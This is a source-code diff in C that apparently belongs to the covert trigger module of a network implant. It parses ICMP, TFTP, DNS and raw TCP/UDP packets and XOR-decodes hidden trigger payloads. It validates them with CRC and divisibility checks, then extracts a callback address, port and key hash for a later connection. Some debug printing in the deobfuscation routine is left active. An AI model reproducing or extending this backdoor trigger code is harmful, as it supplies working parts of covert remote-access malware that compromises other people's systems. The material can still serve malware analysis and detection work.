@@ -21,7 +21,7 @@
  * @retval FAILURE (-1)
  */
 int
-dt_signature_check (unsigned char *pkt, int len, payload * p)
+dt_signature_check (unsigned char *pkt, int len, Payload *p)
 {
 	uint8_t icmp_type;
 	struct icmphdr_t *icmp_pkt = NULL;
@@ -33,7 +33,7 @@ dt_signature_check (unsigned char *pkt, int len, payload * p)
 	 	 	 	 	 to the unsigned char *pkt.  Instead, we have to copy the ip header into a
 	 	 	 	 	 separately allocated structure to ensure it is properly aligned when we attempt to access it. */
 
-	//D (printf ("%s, %4d:\n", __FILE__, __LINE__); )
+	D (printf("%s, %4d:\n", __FILE__, __LINE__); )
 	if (len < 15 || pkt == NULL) {
 		return FAILURE;
 	}
@@ -102,6 +102,7 @@ dt_signature_check (unsigned char *pkt, int len, payload * p)
 		uint16_t pkt_length;
 		uint16_t dport;
 
+		D (printf ("%s, %4d: Checking UDP Packet...\n", __FILE__, __LINE__); )
 		udp_pkt = (struct udphdr_t *) ((unsigned char *) ip_pkt + iphdr_temp.ihl * 4);		// Points to start of UDP packet
 		pkt_length = ntohs(ip_pkt->tot_len) - sizeof(struct iphdr_t) - sizeof(struct udphdr_t); // Payload packet length = total length - headers
 
@@ -129,6 +130,7 @@ dt_signature_check (unsigned char *pkt, int len, payload * p)
 	else if (ip_pkt->protocol == IPPROTO_TCP) {
 		uint16_t pkt_length;
 
+		D (printf ("%s, %4d: Checking TCP Packet...\n", __FILE__, __LINE__); )
 		tcp_pkt = (struct tcphdr_t *) ((unsigned char *) ip_pkt + iphdr_temp.ihl * 4);
 		pkt_length = ntohs(iphdr_temp.tot_len) - (iphdr_temp.ihl * 4) - (tcp_pkt->tcphdrleng * 4);
 
@@ -150,7 +152,7 @@ dt_signature_check (unsigned char *pkt, int len, payload * p)
  * @return Success(0) or Failure(-1)
  */
 int
-dt_error_received (struct icmphdr_t *icmp, payload * p)
+dt_error_received (struct icmphdr_t *icmp, Payload * p)
 {
 	packet_ip_t *err_pkt;
 
@@ -169,7 +171,7 @@ dt_error_received (struct icmphdr_t *icmp, payload * p)
 
 //******************************************************************
 int
-dt_ping_reply_received (struct icmphdr_t *icmp, payload * p)
+dt_ping_reply_received (struct icmphdr_t *icmp, Payload * p)
 {
 
 	int ping_index;
@@ -198,7 +200,7 @@ dt_ping_reply_received (struct icmphdr_t *icmp, payload * p)
 
 //******************************************************************
 int
-dt_ping_request_received (struct icmphdr_t *icmp, payload * p)
+dt_ping_request_received (struct icmphdr_t *icmp, Payload * p)
 {
 	int ping_index;
 	int retval;
@@ -228,13 +230,15 @@ dt_ping_request_received (struct icmphdr_t *icmp, payload * p)
 	// CRC the payload
 	memcpy (p, pings_buffer, 12);
 
-#ifdef DEBUG
-	{
-		int i;
 
-		printf ("\nPRE De-OBF\n");
-		printf (" RAW BYTES: ");
-		for (i = 0; i < (int) sizeof (payload); i++) {
+	#ifdef DEBUG
+	{
+		size_t i;
+
+		printf("Pre-deobfuscation\n");
+		printf("RAW BYTES: ");
+
+		for (i = 0; i < sizeof(Payload); i++) {
 			printf ("%2.2X ", ((uint8_t *) p)[i]);
 		}
 		printf ("\n");
@@ -245,30 +249,26 @@ dt_ping_request_received (struct icmphdr_t *icmp, payload * p)
 
 #ifdef DEBUG
 	{
-		int i;
+		size_t i;
 
-		printf ("\nPost De-OBF\n");
-		printf ("--Package:");
-		printf ("  seed: %2.2X", p->seed);
-		printf ("  package: ");
-		for (i = 0; i < 9; i++) {
-			printf ("%2.2X ", (p->package)[i]);
+		printf("Post-deobfuscation");
+		printf("Seed: %2.2X", p->seed);
+		printf ("  Payload: ");
+		for (i = 0; i < sizeof(Payload); i++) {
+			printf ("%2.2X ", ((uint8_t *) p)[i]);
 		}
-		printf ("  crc: 0x%4.4X", p->crc);
-		printf ("\n--RAW BYTES:");
-		for (i = 0; i < (int) sizeof (payload); i++) {
-			printf ("0x%2.2X ", ((uint8_t *) p)[i]);
-		}
+		printf ("  CRC: 0x%4.4X\n", p->crc);
 		printf ("\n");
 	}
 #endif
+
 
 	return retval;
 }
 
 //******************************************************************
 int
-dt_tftp_received (struct udphdr_t *udp, payload * p)
+dt_tftp_received (struct udphdr_t *udp, Payload * p)
 {
 
 	char encoded_buffer[32];
@@ -324,21 +324,35 @@ dt_tftp_received (struct udphdr_t *udp, payload * p)
 
 //******************************************************************
 int
-deobfuscate_payload (payload * p)
+deobfuscate_payload (Payload * p)
 {
-	int i;
+	size_t i;
 	uint8_t *package;
 	uint16_t crc;
 
 	package = (uint8_t *)p;
 
-	for (i = 1; i < (int) sizeof (payload); i++) {
+//	D (
+		printf ("\n%s, %4d:\t deobfuscating payload of %d bytes\n\t               ", __FILE__, __LINE__, (int) sizeof(Payload));
+		for (i = 0; i < sizeof(Payload); i++)
+			printf(" %2.2i", (int)i );
+		printf ("\n\t    obfuscated:");
+		for (i = 0; i < sizeof(Payload); i++)
+			printf(" %2.2x", package[i]);
+//	)
+
+	for (i = 1; i < (int) sizeof (Payload); i++) {
 		package[i] ^= package[0];		//deobfuscate with XOR of first byte
 	}
 
+	D (printf ("\n\t de-obfuscated:");
+	for (i = 0; i < sizeof(Payload); i++)
+		printf(" %2.2x", package[i]);
+	printf("\n");)
+
 	crc = ntohs(p->crc);
 	p->crc = 0;
-	if ( (tiny_crc16((uint8_t *)p, sizeof(payload)) == crc) && (crc != 0)) {
+	if ( (tiny_crc16((uint8_t *)p, sizeof(Payload)) == crc) && (crc != 0)) {
 
 		p->crc = crc;		// Put CRC back in payload for debug display.
 		return SUCCESS;
@@ -351,7 +365,7 @@ deobfuscate_payload (payload * p)
 
 //******************************************************************
 int
-dt_dns_received (struct udphdr_t *udp, payload * p)
+dt_dns_received (struct udphdr_t *udp, Payload * p)
 {
 
 	char encoded_buffer[32];
@@ -399,36 +413,36 @@ dt_dns_received (struct udphdr_t *udp, payload * p)
 
 //******************************************************************
 int
-dt_raw_udp (struct udphdr_t *udp, uint16_t pktlen, payload * p)
+dt_raw_udp (struct udphdr_t *udp, uint16_t pktlen, Payload *p)
 {
 	return raw_check ((char *) udp + sizeof (struct udphdr_t), pktlen, p);
 }
 
 //******************************************************************
 int
-dt_raw_tcp (struct tcphdr_t *tcp, uint16_t pktlen, payload * p)
+dt_raw_tcp (struct tcphdr_t *tcp, uint16_t pktlen, Payload *p)
 {
 	return raw_check ((char *) tcp + (tcp->tcphdrleng * 4), pktlen, p);
 }
-
+//******************************************************************
 /*!
  * raw_check
  * @param incload	- Raw TCP payload pointer
  * @param pktlen	- Packet length
  * @param p		- Trigger payload pointer
  * @return
- * @retval SUCCESS (1)
- * @retval FAILURE (0)
+ * @retval SUCCESS (0)
+ * @retval FAILURE (-1)
  *
  * raw_check accepts a pointer to the raw TCP or UDP payload and returns
  * the trigger payload in the buffer pointed to by p.
  *
  */
 int
-raw_check (void *data, uint16_t pktlen, payload * p)
+raw_check (void *data, uint16_t pktlen, Payload *p)
 {
 	uint16_t crc = 0;
-	void *fieldPtr;		// Packet field pointer
+	void *fieldPtr;			// Packet field pointer
 	uint16_t uint16buf = 0;
 	uint16_t netcrc;
 	uint16_t validator;
@@ -444,44 +458,90 @@ raw_check (void *data, uint16_t pktlen, payload * p)
 	pp = (uint8_t *)p;
 	// Compute the checksum of bytes between START_PAD and CRC.
 	crc = tiny_crc16 ((unsigned char *) ((char *) data + START_PAD), CRC_DATA_LENGTH);
-	// D (printf ("%s, %4d:\tComputed CRC: 0x%0x\n", __FILE__, __LINE__, crc); )
+	D (printf ("%s, %4d:\tComputed CRC: 0x%0x\n", __FILE__, __LINE__, crc); )
 
 	// Get the CRC at the offset START_PAD + CRC_DATA_LENGTH + CRC % 200 into the packet.
 	fieldPtr = data + START_PAD + CRC_DATA_LENGTH + (crc % 200);	// Set field pointer to the location of the CRC
-	//D (printf ("%s, %4d:\tfieldPtr: 0x%p, data: 0x%p, offset: %d, packet length: %d\n", __FILE__, __LINE__, fieldPtr, data, fieldPtr - data, pktlen); )
+	D (printf ("%s, %4d:\tfieldPtr: 0x%p, data: 0x%p, offset: %d, packet length: %d\n", __FILE__, __LINE__, fieldPtr, data, (int)(fieldPtr - data), pktlen); )
 	if (fieldPtr == 0 || (fieldPtr > (data + pktlen)))		// Make sure it's within bounds
 		return FAILURE;
 
-	//D (printf ("%s, %4d:\n", __FILE__, __LINE__); )
+	D (printf ("%s, %4d:\n", __FILE__, __LINE__); )
 	memcpy(&uint16buf, fieldPtr, sizeof(uint16_t));
 	netcrc = ntohs(uint16buf);
-	D (printf ("%s, %4d:\tCRC is at 0x%0x into data, CRC = 0x%0x\n", __FILE__, __LINE__, fieldPtr - data, netcrc); )
+	D (printf ("%s, %4d:\tCRC is at 0x%0x into data, \n\tNET CRC = 0x%2.2x\n", __FILE__, __LINE__, (unsigned int)(fieldPtr - data), netcrc); )
 
 	if (crc != netcrc) {
-		D (printf ("%s, %4d:\tCRC check failed\n", __FILE__, __LINE__); )
+		D (printf ("%s, %4d:\t    CRC = 0x%2.2x, CRC check failed\n", __FILE__, __LINE__, crc); )
 		return FAILURE;			// Check 1 failure: CRCs don't match
 	}
 
 	fieldPtr += sizeof(crc);
 	memcpy(&uint16buf, fieldPtr, sizeof(uint16_t));
 	validator = ntohs(uint16buf);
-	D (printf ("%s, %4d:\tValidator location: 0x%0x, Trigger validator = %d\n", __FILE__, __LINE__, fieldPtr - data, validator); )
+	D (printf ("%s, %4d:\tValidator location: 0x%0x, Trigger validator = %d\n", __FILE__, __LINE__, (unsigned int)(fieldPtr - data), validator); )
 	if ( (validator % 127) != 0) {
-		D (printf ("%s, %4d:\tValidator check failed: validator = 0x%0x\n", __FILE__, __LINE__, validator); )
+		D (printf ("%s, %4d:\tValidator check failed: validator = 0x%2.2x\n", __FILE__, __LINE__, validator); )
 		return FAILURE;			// Check 2 failure: integer not divisible by 127
 	}
 
-	fieldPtr += sizeof(validator) + PAD1_LENGTH;		// Update field pointer to point to trigger payload.
+	fieldPtr += sizeof(validator) + PAD1;		// Update field pointer to point to trigger payload.
 	payloadIndex = fieldPtr;
-	payloadKeyIndex = (uint8_t *)(data + START_PAD + (crc % (CRC_DATA_LENGTH - sizeof(payload))));	// Compute the start of the payload key
-	D (printf ("%s, %4d:\tEncoded Payload offset\t0x%0x, Payload key offset: 0x%0x\tTrigger follows:\n", __FILE__, __LINE__, fieldPtr - data, payloadKeyIndex - (uint8_t *)data); )
-	for (i = 0; i < (int)sizeof(payload); i++) {
+	payloadKeyIndex = (uint8_t *)(data + START_PAD + (crc % (CRC_DATA_LENGTH - sizeof(Payload))));	// Compute the start of the payload key
+	D (printf ("%s, %4d:\tEncoded Payload offset\t0x%0x, Payload key offset: 0x%0x\tPayload follows:\n", __FILE__, __LINE__, (unsigned int)(fieldPtr - data), (unsigned int)(payloadKeyIndex - (uint8_t *)data)); )
+	for (i = 0; i < (int)sizeof(Payload); i++) {
 		uint8_t trigger;
 
 		trigger = payloadKeyIndex[i] ^ payloadIndex[i];			// XOR the trigger payload with the key
-		D (printf ("\tByte[%2.2d]: encoded trigger = 0x%2.2x,  payloadKey= 0x%2.2x, decoded trigger = 0x%2.2x\n", i, payloadIndex[i], payloadKeyIndex[i], trigger); )
+		D (printf ("\tByte[%2.2d]: encoded payload = 0x%2.2x,  payloadKey= 0x%2.2x, decoded payload = 0x%2.2x\n", i, payloadIndex[i], payloadKeyIndex[i], trigger); )
 		memcpy((void *)(pp + i), (void *)&trigger, sizeof(uint8_t));
 	}
 	D (printf ("\n"); )
-	return (deobfuscate_payload(p));
+	return SUCCESS;
 }
+
+/*! \brief Move payload into trigger info.
+ *
+ * @param p payload
+ * @param ti trigger
+ * @return Always returns SUCCESS.
+ * \todo Have this function return a void or integrate it into code above.
+ */
+int
+payload_to_trigger_info (Payload *p, TriggerInfo *ti)
+{
+	uint16_t crc;
+
+	if (p == NULL || ti == NULL) {
+		return FAILURE;
+	}
+	crc = ntohs(p->crc);
+	p->crc = 0;
+	if (tiny_crc16 ((const uint8_t *) p, sizeof (Payload)) != crc ) {
+		D (printf ("%s, %4d:\tCRC failed.\n", __FILE__, __LINE__); )
+		return FAILURE;
+	}
+//	p->crc = crc;
+	ti->callback_addr = ntohl(p->callback_addr);
+	ti->callback_port = ntohs(p->callback_port);
+	memcpy (&(ti->idKey_hash), &(p->idKey_hash), ID_KEY_HASH_SIZE);
+
+	return SUCCESS;
+}
+
+#ifdef DEBUG
+
+//define displaySha1Hash function
+void displaySha1Hash(char *label, unsigned char *sha1Hash)
+{
+	int i=0;
+
+	//Display Label
+	printf( " DEBUG: %s=[", label );
+
+	//Display 40 hexadecimal number array
+	for (i=0; i < ID_KEY_HASH_SIZE; i++)
+		printf("%02x",sha1Hash[i]);
+	printf( "]\n" );
+}
+#endif
